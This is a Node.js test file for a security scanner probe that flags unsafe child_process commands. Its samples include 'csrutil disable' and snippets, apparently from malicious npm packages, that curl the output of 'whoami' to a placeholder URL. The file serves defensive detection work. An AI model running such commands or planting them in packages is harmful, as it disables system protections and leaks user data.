// Import Node.js Dependencies
import { test } from "node:test";
import assert from "node:assert/strict";

// Import Internal Dependencies
import { parseScript, getSastAnalysis } from "../utils/index.js";
import isUnsafeCommand from "../../src/probes/isUnsafeCommand.js";

// CONSTANTS
const kWarningUnsafeCommand = "unsafe-command";

// Command types to test
const COMMAND_TYPES = ["spawn", "spawnSync", "exec", "execSync"];

test("should detect csrutil command", () => {
  COMMAND_TYPES.forEach((cmdType) => {
    const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
    const args = isArrayBased ? `"csrutil", ["status"]` : `"csrutil status"`;

    const str = `
      const { ${cmdType} } = require("child_process");
      ${cmdType}(${args});
    `;

    const ast = parseScript(str);
    const sastAnalysis = getSastAnalysis(str, isUnsafeCommand)
      .execute(ast.body);

    const result = sastAnalysis.getWarning(kWarningUnsafeCommand);
    assert.equal(result.kind, kWarningUnsafeCommand);
    assert.equal(result.value, "csrutil status");
  });
});

// TODO: de-skip when the tracer would be ready
test.skip("should detect hidden csrutil command", () => {
  COMMAND_TYPES.forEach((cmdType) => {
    const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
    const args = isArrayBased ? `"csrutil", ["status"]` : `"csrutil status"`;

    const str = `
      const { ${cmdType}: hide } = require("child_process");
      hide(${args});
    `;

    const ast = parseScript(str);
    const sastAnalysis = getSastAnalysis(str, isUnsafeCommand)
      .execute(ast.body);

    const result = sastAnalysis.getWarning(kWarningUnsafeCommand);
    assert.equal(result.kind, kWarningUnsafeCommand);
    assert.equal(result.value, "csrutil status");
  });
});

test("should detect csrutil command with require", () => {
  COMMAND_TYPES.forEach((cmdType) => {
    const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
    const args = isArrayBased ? `"csrutil", ["disable"]` : `"csrutil disable"`;

    const str = `
      require("child_process").${cmdType}(${args});
    `;

    const ast = parseScript(str);
    const sastAnalysis = getSastAnalysis(str, isUnsafeCommand)
      .execute(ast.body);

    const result = sastAnalysis.getWarning(kWarningUnsafeCommand);
    assert.equal(result.kind, kWarningUnsafeCommand);
    assert.equal(result.value, "csrutil disable");
  });
});

test("should not detect non suspicious command", () => {
  COMMAND_TYPES.forEach((cmdType) => {
    const isArrayBased = cmdType === "spawn" || cmdType === "spawnSync";
    const args = isArrayBased ? `"ls", ["-la"]` : `"ls -la"`;

    const str = `
      const { ${cmdType} } = require("child_process");
      ${cmdType}(${args});
    `;

    const ast = parseScript(str);
    const sastAnalysis = getSastAnalysis(str, isUnsafeCommand)
      .execute(ast.body);

    assert.equal(sastAnalysis.warnings().length, 0);
  });
});

// Note: Until we can safely test with actual malware samples,
// these tests uses a truncated snippet from a known malicious package.

test("aog-checker detection", () => {
  // Ref: https://socket.dev/npm/package/aog-checker/files/99.99.99/index.js
  const maliciousCode = `
	  const { execSync } = require("child_process");
    // truncated ...
    let uname = "";
    try {
      uname = execSync("uname -a").toString().trim();
    } catch (e) {
      uname = "N/A";
    }
  `;

  const ast = parseScript(maliciousCode);
  const sastAnalysis = getSastAnalysis(maliciousCode, isUnsafeCommand)
    .execute(ast.body);

  const result = sastAnalysis.getWarning(kWarningUnsafeCommand);
  assert.equal(result.kind, kWarningUnsafeCommand);
  assert.equal(result.value, "uname -a");
});

test("mydummyproject-zyp detection", () => {
  // Ref: https://socket.dev/npm/package/mydummyproject-zyp/files/99.9.9/index.js
  const maliciousCode = `
    require('child_process').exec('ping -c 4 <URL>');
    require('child_process').exec(\`curl -X POST -d "$(whoami)" <URL>/c\`);
    require('child_process').exec(\`curl "<URL>/c?user=$(whoami)"\`);
  `;

  const ast = parseScript(maliciousCode);
  const sastAnalysis = getSastAnalysis(maliciousCode, isUnsafeCommand)
    .execute(ast.body);

  const result = sastAnalysis.warnings();
  assert.equal(result.at(0).kind, kWarningUnsafeCommand);
  assert.equal(result.at(0).value, "ping -c 4 <URL>");
  assert.equal(result.at(1).kind, kWarningUnsafeCommand);
  assert.equal(result.at(1).value, "curl -X POST -d \"$(whoami)\" <URL>/c");
  assert.equal(result.at(2).kind, kWarningUnsafeCommand);
  assert.equal(result.at(2).value, "curl \"<URL>/c?user=$(whoami)\"");
});
